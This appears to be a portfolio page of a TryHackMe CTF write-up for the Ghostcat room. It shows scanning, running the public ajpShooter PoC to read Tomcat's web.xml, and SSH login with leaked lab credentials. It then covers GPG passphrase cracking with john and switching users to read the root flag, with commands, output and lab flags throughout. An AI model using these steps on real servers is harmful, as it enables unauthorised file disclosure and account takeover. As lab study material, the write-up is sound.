@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghostcat / AJP | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 75ch; margin: 0 auto; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; }
+        body { background-color: #0f172a; color: #cbd5e1; }
+    </style>
+</head>
+<body class="p-8 md:p-16">
+    <nav class="mb-12"><a href="../index.html" class="text-accent-cyan hover:underline">&larr; Back to Portfolio</a></nav>
+    <article class="max-w-4xl mx-auto">
+        <header class="mb-12">
+            <div class="text-accent-green font-mono text-sm mb-2 uppercase">tryhackme</div>
+            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Ghostcat / AJP</h1>
+            <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
+        </header>
+        <div class="markdown-content">
+            <h2>TL;DR (short summary)</h2>
+<ul>
+<li>Target: <code>10.201.72.230</code>.</li>
+<li>Open ports discovered: <code>22</code> (ssh), <code>53</code> (dns), <code>8009</code> (AJP13), <code>8080</code> (HTTP).</li>
+<li>AJP (8009) was vulnerable to Ghostcat (CNVD-2020-10487). Using an AJP exploit (AJPShooter/Ghostcat) I read <code>/WEB-INF/web.xml</code> and discovered credentials <code>skyfuck:8730281lkjlkjdqlksalks</code>.</li>
+<li>SSH into the machine as <code>skyfuck</code>, found <code>credential.pgp</code> and <code>tryhackme.asc</code> in <code>/home/skyfuck</code>.</li>
+<li>Downloaded both files with <code>scp</code>, cracked the <code>.asc</code> (<code>gpg2john</code> → <code>john</code>), used the recovered password to decrypt <code>credential.pgp</code> (<code>gpg --decrypt</code>) and recovered additional credentials which enabled privilege escalation to root and retrieval of the root flag.</li>
+</ul>
+<h2>Environment / tools (what I used)</h2>
+<ul>
+<li>Tools and utilities used:</li>
+<li><code>nmap</code> — port scanning</li>
+<li><code>python3</code> — to run AJPShooter/Ghostcat PoC</li>
+<li><code>git</code> — clone exploit repo</li>
+<li><code>ssh</code> / <code>scp</code> — remote login and file transfer</li>
+<li><code>john</code> and <code>gpg2john</code> (from <code>john</code> package) — crack passphrase for GPG encrypted file</li>
+<li><code>gpg</code> — decrypt <code>credential.pgp</code></li>
+<li><code>wordlist</code> - types of pwds</li>
+</ul>
+<p>Install quick reference (Kali/Debian):</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>nmap<span class="w"> </span>git<span class="w"> </span>python3<span class="w"> </span>python3-pip<span class="w"> </span>john<span class="w"> </span>gpg
+<span class="c1"># Note: gpg2john is usually included with the &#39;john&#39; package or in john-contrib.</span>
+</code></pre></div>
+
+<p><strong>Placeholders for outputs:</strong> replace the <code>&lt;!-- ADD: ... --&gt;</code> markers with your screenshot filenames or paste terminal outputs in the indicated places.</p>
+<h2>1) Recon — Nmap</h2>
+<p><strong>Command used:</strong></p>
+<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span><span class="m">10</span>.201.72.230
+</code></pre></div>
+
+<p><strong>Key output</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2025-09-28 15:29 EDT</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.201.72.230</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.36</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">996</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span>
+<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span>
+<span class="mi">8009</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ajp13</span>
+<span class="mi">8080</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="o">-</span><span class="nx">proxy</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">24.42</span><span class="w"> </span><span class="nx">seconds</span>
+</code></pre></div>
+
+<p><strong>Notes:</strong> AJP (8009) is often used by Tomcat and has had known vulnerabilities (Ghostcat). When you see <code>ajp13</code> open together with an HTTP port (8080), Ghostcat is likely.</p>
+<h2>2) Exploit — Ghostcat / AJPShooter</h2>
+<p><strong>What I used:</strong> the AJPShooter / Ghostcat POC repo:</p>
+<div class="codehilite"><pre><span></span><code>https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
+</code></pre></div>
+
+<p><strong>Commands:</strong></p>
+<div class="codehilite"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
+<span class="nb">cd</span><span class="w"> </span>Ghostcat-CNVD-2020-10487
+python3<span class="w"> </span>ajpShooter.py<span class="w"> </span>http://10.201.72.230:8080<span class="w"> </span><span class="m">8009</span><span class="w"> </span>/WEB-INF/web.xml<span class="w"> </span><span class="nb">read</span>
+</code></pre></div>
+
+<p><strong>Key Output</strong></p>
+<div class="codehilite"><pre><span></span><code>...<span class="w"> </span>(AJPShooter<span class="w"> </span>banner<span class="w"> </span>and<span class="w"> </span>HTTP<span class="w"> </span>headers)<span class="w"> </span>...
+
+<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+...
+<span class="nt">&lt;web-app</span><span class="w"> </span><span class="err">...</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;display-name&gt;</span>Welcome<span class="w"> </span>to<span class="w"> </span>Tomcat<span class="nt">&lt;/display-name&gt;</span>
+<span class="w">  </span><span class="nt">&lt;description&gt;</span>
+<span class="w">     </span>Welcome<span class="w"> </span>to<span class="w"> </span>GhostCat
+<span class="w">        </span>skyfuck:8730281lkjlkjdqlksalks
+<span class="w">  </span><span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;/web-app&gt;</span>
+</code></pre></div>
+
+<p><strong>Tip:</strong> Save the <code>web.xml</code> output or screenshot it. That contains the plaintext credential.</p>
+<hr />
+<h2>3) Initial access — SSH</h2>
+<p><strong>SSH into the box using the found credentials:</strong></p>
+<div class="codehilite"><pre><span></span><code>ssh<span class="w"> </span>skyfuck@10.201.72.230
+<span class="c1"># password: 8730281lkjlkjdqlksalks</span>
+</code></pre></div>
+
+<p><strong>Key Output</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="n">skyfuck</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">credential</span><span class="p">.</span><span class="n">pgp</span><span class="w">  </span><span class="n">tryhackme</span><span class="p">.</span><span class="k">asc</span>
+</code></pre></div>
+
+<p>Check other user homes:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">skyfuck</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">merlin</span>
+<span class="n">skyfuck</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">merlin</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">skyfuck</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">merlin</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">THM</span><span class="err">{</span><span class="n">GhostCat_1s_so_cr4sy</span><span class="err">}</span>
+</code></pre></div>
+
+<hr />
+<h2>4) Exfiltrate files for offline cracking</h2>
+<p><strong>Command</strong></p>
+<div class="codehilite"><pre><span></span><code>scp<span class="w"> </span>skyfuck@10.201.72.230:/home/skyfuck/*<span class="w"> </span>.
+<span class="c1"># or scp skyfuck@10.201.72.230:/home/skyfuck/credential.pgp .</span>
+</code></pre></div>
+
+<p><strong>Example output</strong></p>
+<div class="codehilite"><pre><span></span><code>credential.pgp
+tryhackme.asc
+</code></pre></div>
+
+<hr />
+<h2>5) Crack the passphrase for the .asc file (offline cracking)</h2>
+<p><strong>Reasoning:</strong> <code>tryhackme.asc</code> is an encrypted key or file. <code>gpg2john</code> converts GPG files into a john-readable hash format.</p>
+<p><strong>Commands:</strong></p>
+<div class="codehilite"><pre><span></span><code>gpg2john<span class="w"> </span>tryhackme.asc<span class="w"> </span>&gt;<span class="w"> </span>tryhackme.hash
+john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>tryhackme.hash
+</code></pre></div>
+
+<p><strong>Key output</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">hash</span><span class="w"> </span><span class="ss">(</span><span class="nv">gpg</span>,<span class="w"> </span><span class="nv">OpenPGP</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">GnuPG</span><span class="w"> </span><span class="nv">Secret</span><span class="w"> </span><span class="nv">Key</span><span class="w"> </span>[<span class="mi">32</span><span class="o">/</span><span class="mi">64</span>]<span class="ss">)</span>
+<span class="nv">Cost</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ss">(</span><span class="nv">s2k</span><span class="o">-</span><span class="nv">count</span><span class="ss">)</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="mi">65536</span><span class="w"> </span>...
+<span class="mi">1</span><span class="nv">g</span><span class="w"> </span><span class="mi">0</span>:<span class="mi">00</span>:<span class="mi">00</span>:<span class="mi">00</span><span class="w"> </span><span class="nv">DONE</span><span class="w"> </span><span class="ss">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">28</span><span class="w"> </span><span class="mi">15</span>:<span class="mi">49</span><span class="ss">)</span><span class="w"> </span><span class="mi">5</span>.<span class="mi">555</span><span class="nv">g</span><span class="o">/</span><span class="nv">s</span><span class="w"> </span>...<span class="w"> </span><span class="nv">alexandru</span><span class="w"> </span><span class="ss">(</span><span class="nv">tryhackme</span><span class="ss">)</span>
+<span class="nv">Use</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span><span class="nv">option</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">display</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">cracked</span><span class="w"> </span><span class="nv">passwords</span><span class="w"> </span><span class="nv">reliably</span>
+<span class="nv">Session</span><span class="w"> </span><span class="nv">completed</span>.
+</code></pre></div>
+
+<p><strong>Note:</strong> if you name the output file <code>tryhackme.hash</code>, use that filename when invoking <code>john</code>. In some runs the file was named <code>hash</code>; be consistent.</p>
+<hr />
+<h2>6) Decrypt <code>credential.pgp</code> with the cracked passphrase</h2>
+<p><strong>Command:</strong></p>
+<div class="codehilite"><pre><span></span><code>gpg<span class="w"> </span>--decrypt<span class="w"> </span>credential.pgp
+<span class="c1"># enter the passphrase john found when prompted</span>
+</code></pre></div>
+
+<p><strong>Example gpg output</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="n">gpg</span><span class="o">:</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">elg1024</span><span class="w"> </span><span class="n">key</span><span class="o">,</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="mi">61</span><span class="n">E104A6</span><span class="o">...,</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">11</span>
+<span class="n">gpg</span><span class="o">:</span><span class="w"> </span><span class="n">WARNING</span><span class="o">:</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="n">algorithm</span><span class="w"> </span><span class="n">CAST5</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">recipient</span><span class="w"> </span><span class="n">preferences</span>
+<span class="n">merlin</span><span class="o">:</span><span class="n">asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</span>
+</code></pre></div>
+
+<p>The decrypted content gave <code>merlin:&lt;password&gt;</code> which you can use to log in as <code>merlin</code>.</p>
+<p><strong>Security note:</strong> avoid publishing real, sensitive passwords on public repos — replace with <code>[REDACTED]</code> if you post publicly.</p>
+<hr />
+<h2>7) Use recovered credentials to escalate to root</h2>
+<p><strong>Steps you took:</strong><br />
+- You switched to the <code>merlin</code> user:</p>
+<div class="codehilite"><pre><span></span><code>su<span class="w"> </span>merlin
+</code></pre></div>
+
+<ul>
+<li>From there you accessed the root directory and read the flag:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/root
+ls
+cat<span class="w"> </span>root.txt
+<span class="c1"># THM{Z1P_1S_FAKE}</span>
+</code></pre></div>
+
+<p><strong>Additional recommended checks (for writeup):</strong><br />
+- Run <code>sudo -l</code> (as merlin or skyfuck) to check sudo rights before attempting <code>su</code>.<br />
+- Capture the output of <code>id</code> after switching users to show context: <code>id</code>, <code>whoami</code>.</p>
+        </div>
+    </article>
+</body>
+</html>
